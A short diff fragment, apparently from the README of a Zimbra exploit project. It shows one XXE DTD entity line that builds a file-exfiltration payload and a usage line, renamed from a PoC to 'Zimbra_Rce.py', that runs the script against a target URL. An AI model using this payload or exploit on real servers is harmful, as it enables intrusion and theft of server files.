@@ -8,4 +8,4 @@ demo.dtd
 <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
 ``` 
 useage:
-python zimbra_poc.py https://target.com
+python Zimbra_Rce.py https://target.com
